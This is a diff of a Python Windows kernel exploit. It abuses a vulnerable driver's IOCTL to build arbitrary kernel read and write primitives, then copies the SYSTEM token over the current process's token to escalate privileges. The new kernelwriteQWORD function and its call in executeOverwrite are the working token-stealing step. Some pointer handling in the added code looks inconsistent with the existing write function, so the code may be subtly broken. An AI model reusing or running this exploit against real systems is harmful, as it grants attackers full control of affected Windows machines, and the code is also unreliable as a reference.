@@ -178,15 +178,14 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
     return long(system_proc_struct_base_ptr)
 
+################################################### USER WRITE FUNCTION ###########################################################
 
-################################################### WRITE ###########################################################
-
-def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x4242424242424242):
+def userwriteQWORD(driver, what=None, USER_MEM_PAGE_PTR=None):
     
     # Write the what value to WRITE_TARGET_ADDR
 
     data = struct.pack("<Q", what)
-    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, WRITE_TARGET_ADDR, data, len(data), byref(written))
+    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_WRITE_TARGET_ADDR, data, len(data), byref(written))
     
     if dwStatus == 0:
         print("Something went wrong while writing to memory","e")
@@ -194,7 +193,7 @@ def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x424242424242
 
     # Pack the address of the what value and the USER_MEM_PAGE_PTR address
 
-    data = struct.pack("<Q", WRITE_TARGET_ADDR) + struct.pack("<Q", USER_MEM_PAGE_PTR)
+    data = struct.pack("<Q", USER_WRITE_TARGET_ADDR) + struct.pack("<Q", USER_MEM_PAGE_PTR)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
     if dwStatus == 0:
         print("Something went wrong while writing to memory in the packing section","e")
@@ -210,14 +209,49 @@ def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x424242424242
 
     print "Value before DeviceIoControl: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-    print "Our memory target is: " + str(hex(WRITE_TARGET_ADDR))
+    print "Our memory target is: " + str(hex(USER_WRITE_TARGET_ADDR))
     print "I wrote this to our memory target: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
-################################################### READ ###########################################################
-                          # What is it you want to read? #We are writing it back to userland memory.
+################################################### KERNEL WRITE FUNCTION ###########################################################
 
-def readPrimitive(driver, WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR):
+def kernelwriteQWORD(driver, system_token, CURRENT_PROCESS_BASE_STRUCT_PTR):
+    
+    # Write the what value (system_token) to CURRENT_PROCESS_BASE_STRUCT_PTR
+
+    data = struct.pack("<Q", system_token)
+    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_MEM_PAGE_PTR, data, len(data), byref(written))
+    
+    if dwStatus == 0:
+        print("Something went wrong while writing to memory","e")
+        sys.exit()
+
+    # Pack the address of the what value and the current target process address we want to overwrite.
+
+    data = struct.pack("<Q", USER_MEM_PAGE_PTR) + struct.pack("<Q", CURRENT_PROCESS_BASE_STRUCT_PTR)
+    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_MEM_PAGE_PTR, data, len(data), byref(written))
+    if dwStatus == 0:
+        print("Something went wrong while writing to memory in the packing section","e")
+        sys.exit()
+    
+    IoControlCode = IOCTL_code
+    InputBuffer = c_void_p(USER_ADDR)
+    InputBufferLength = 0x10
+    OutputBuffer = c_void_p(0x0)
+    OutputBufferLength = 0x0
+    dwBytesReturned = c_ulong()
+    lpBytesReturned = byref(dwBytesReturned)
+
+    #print "Value before DeviceIoControl: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
+    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
+    #print "Our memory target is: " + str(hex(USER_WRITE_TARGET_ADDR))
+    #print "I wrote this to our memory target: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
+    return triggerIOCTL
+
+################################################### READ ###########################################################
+                          # is it you want to read? #We are writing it back to userland memory.
+
+def readPrimitive(driver, USER_WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR):
 
     IoControlCode = IOCTL_code
     InputBuffer = c_void_p(1)
@@ -227,7 +261,7 @@ def readPrimitive(driver, WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR):
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
 
-    data = struct.pack('<QQ', WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR)
+    data = struct.pack('<QQ', USER_WRITE_TARGET_ADDR, USER_MEM_PAGE_PTR)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE,
             USER_ADDR, data, len(data), byref(written))
 
@@ -349,9 +383,13 @@ def executeOverwrite():
 
             current_token = current_proc_base_struct_ptr + TOKEN_OFFSET
 
-            what = process_struct_ptr 
-            writeQWORD(driver, what, USER_MEM_PAGE_PTR)
+                                    #what              #where                                
+            userwriteQWORD(driver, process_struct_ptr, USER_MEM_PAGE_PTR)
+
+
             #print "MAIN Attempting system to current token overwrite!"
+                                     #what         #where
+            kernelwriteQWORD(driver, system_token, current_token)
 
             #success = writePrimitive(driver, system_token, current_token, system_token)
 
